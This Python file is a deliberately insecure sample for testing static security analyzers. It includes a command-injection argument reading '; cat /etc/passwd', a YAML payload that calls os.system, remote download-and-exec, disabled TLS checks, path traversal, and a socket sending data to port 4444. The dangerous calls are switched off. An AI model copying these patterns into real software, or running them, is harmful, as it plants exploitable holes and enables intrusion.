"""
⚠️ INTENTIONALLY INSECURE SAMPLE FILE — DO NOT RUN
This file contains 'rogue' patterns to exercise static/security analyzers.
All dangerous calls are behind `DANGEROUS = False` and the script exits on run.
"""

import os
import subprocess
import base64
import pickle
import yaml            # pip install pyyaml
import urllib.request
import requests        # pip install requests
import ssl
import random
import hashlib
import socket
import tempfile
import ctypes

# Toggle only inside a disposable sandbox if you truly need to execute anything.
DANGEROUS = False

# Suspicious/encoded blob (looks shady; content is harmless)
PAYLOAD_B64 = "aW1wb3J0IG9zCg=="  # "import os" (decoded) — classic heuristic trigger

def hardcoded_credentials():
    # Rogue pattern: hardcoded secrets/URLs
    API_KEY = "sk_live_51JXabcSECRET"
    PASSWORD = "P@ssw0rd!"
    DB_URL = "postgres://root:root@localhost:5432/prod"
    return API_KEY, PASSWORD, DB_URL

def command_injection(user_arg="; cat /etc/passwd"):
    # Rogue pattern: command composed from user input
    cmd = f"echo hello {user_arg}"
    if DANGEROUS:
        os.system(cmd)                              # ❌ os.system
        subprocess.run(cmd, shell=True, check=False)  # ❌ shell=True

def unsafe_eval():
    # Rogue pattern: dynamic code execution
    payload = "print('hi from eval')"
    if DANGEROUS:
        eval(payload)  # ❌ eval

def unsafe_deserialization():
    # Rogue patterns: pickle.loads and yaml.load (no SafeLoader)
    data_b64 = base64.b64encode(pickle.dumps({"a": 1})).decode()
    if DANGEROUS:
        obj = pickle.loads(base64.b64decode(data_b64))  # ❌ pickle.loads
        _ = obj
    yml = "a: 1\nb: !!python/object/apply:os.system ['echo from yaml']\n"
    if DANGEROUS:
        yaml.load(yml)  # ❌ yaml.load without Loader/SafeLoader

def download_and_exec(url="http://example.com/code.py"):
    # Rogue pattern: download then exec
    if DANGEROUS:
        code = urllib.request.urlopen(url, timeout=3).read().decode()
        exec(code)  # ❌ exec of remote content

def weak_crypto_and_ssl():
    # Rogue patterns: weak hash + disabled TLS verification
    password = "secret"
    md5 = hashlib.md5(password.encode()).hexdigest()  # ❌ MD5 for secrets
    if DANGEROUS:
        requests.get("https://example.com", verify=False)  # ❌ verify=False
        ssl._create_default_https_context = ssl._create_unverified_context  # ❌
    return md5

def improper_tempfile():
    # Rogue pattern: writing to world-writable path predictably
    path = "/tmp/app.cfg"
    if DANGEROUS:
        with open(path, "w") as f:
            f.write("secrets=1")
    return path

def path_traversal(filename="../../etc/hosts"):
    # Rogue pattern: path traversal risk
    if DANGEROUS:
        with open(filename) as f:
            return f.read()

def exfiltration_like():
    # Rogue pattern: suspicious socket egress (TEST-NET-3 address)
    s = socket.socket()
    try:
        if DANGEROUS:
            s.connect(("203.0.113.10", 4444))  # reserved doc address
            s.send(b"hello")                   # placeholder payload
    finally:
        s.close()

def unsafe_ctypes():
    # Rogue pattern: direct libc call
    if DANGEROUS:
        lib = ctypes.CDLL("libc.so.6")
        lib.system(b"echo from ctypes")  # ❌ arbitrary command

def blanket_except():
    # Rogue pattern: broad exception swallowing
    try:
        1 / 0
    except Exception:
        pass

def insecure_random_for_secret():
    # Rogue pattern: using random() to generate a token
    token = "".join(str(random.randint(0, 9)) for _ in range(12))
    return token

def main():
    hardcoded_credentials()
    command_injection()
    unsafe_eval()
    unsafe_deserialization()
    weak_crypto_and_ssl()
    improper_tempfile()
    path_traversal()
    exfiltration_like()
    unsafe_ctypes()
    blanket_except()
    insecure_random_for_secret()

if __name__ == "__main__":
    raise SystemExit(
        "This file is intentionally insecure and is not meant to be executed."
    )
